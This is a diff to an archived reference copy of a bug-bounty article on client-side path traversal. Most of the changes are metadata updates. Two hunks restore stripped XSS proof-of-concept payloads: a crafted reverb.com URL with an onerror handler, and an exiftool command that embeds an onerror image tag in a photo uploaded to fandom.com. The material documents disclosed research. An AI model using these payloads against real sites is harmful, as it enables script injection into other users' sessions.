@@ -6,9 +6,9 @@ resource: "https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-
 tags: [article, webseclist-reference, en, medium, path-traversal, xss, open-redirect, rest-api, url-parsing, file-upload, dom, nextjs, bug-bounty, attack-chain, owasp-a01-2021, owasp-a03-2021, owasp-a04-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T15:32:19+00:00"
+  at: "2026-08-16T00:00:50+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1"
@@ -23,7 +23,7 @@ canonical_url: ""
 cited_by:
   - "2025.md:61"
 commit: ""
-content_sha256: 22316d8bf24a507338c5d107fb676220cd8cb275ee2adcafc0216e45a335a16f
+content_sha256: 9b9203b82a8d054e34980e11af51da7f4142c0da7ab4367e51a5e19b3f756624
 depth: full
 depth_reason: default
 kind: article
@@ -35,8 +35,8 @@ publisher: Medium
 publisher_english: ""
 raw_sha256: 0c0d066cf422860d8db7c9f26c592d216b24af08313437611cfddc68be42c768
 retrieved_from: "https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T15:32:19+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-16T00:00:50+00:00"
 slug: 2025-medium-client-side-path-traversal-cspt-bug-bounty-reports-techniques
 snapshot: ""
 title_english: ""
@@ -50,7 +50,7 @@ translation_of: ""
 
 - Published: 2025-01-24
 - Original: <https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1>
-- Preserved from: https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1 (live) on 2026-08-10
+- Preserved from: https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1 (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -209,7 +209,7 @@ By checking the js code `<%= comparison_shopping_page.title %>` the page title w
 `https://reverb.com/affiliates/comparison_shopping_embeds/%252e%252e%2f%252e%252e%2fattachinary%2fcors%3f_links[web]=&photos[][_links[small_crop[href]]]=&title=renwa%3Cimg+src=x+onerror=alert%60XSS%60%3E`
 
 ```
-renwa<img src="x" >
+renwa<img src="x" onerror="alert`XSS`">
 ```
 
 (The attachinary endpoint bug is still not patched [https://github.com/assembler/attachinary/issues/172](https://github.com/assembler/attachinary/issues/172))
@@ -277,7 +277,7 @@ Only pages under `/wiki` are usable and we can't use any other pages so I looked
 `https://community.fandom.com/wiki/File:Test_renwa_bc.jpeg `By using this URL:`https://community.fandom.com/wiki/Special:Redirect/file/test_renwa_bc.jpeg` we will be redirected to the original file `[https://static.wikia.nocookie.net/central/images/2/2f/Test_renwa_bc.jpeg/revision/latest?cb=20221115080815](https://static.wikia.nocookie.net/central/images/2/2f/Test_renwa_bc.jpeg/revision/latest?cb=20221115080815)`
 
 Using `Exiftools` I embedded an XSS payload to my image using this command:
-`exiftool "-comment='<img src=x xss_bc_test2.jpeg`Then uploading the Image will contain our payload which we can use with the `<tabview>` vulnerability.
+`exiftool "-comment='<img src=x onerror=alert(origin)>'" xss_bc_test2.jpeg`Then uploading the Image will contain our payload which we can use with the `<tabview>` vulnerability.
 
 **POC:**
 **1.**Upload the attached file `xss_bc_test2.jpeg` in here `https://community.fandom.com/wiki/Special:Upload`
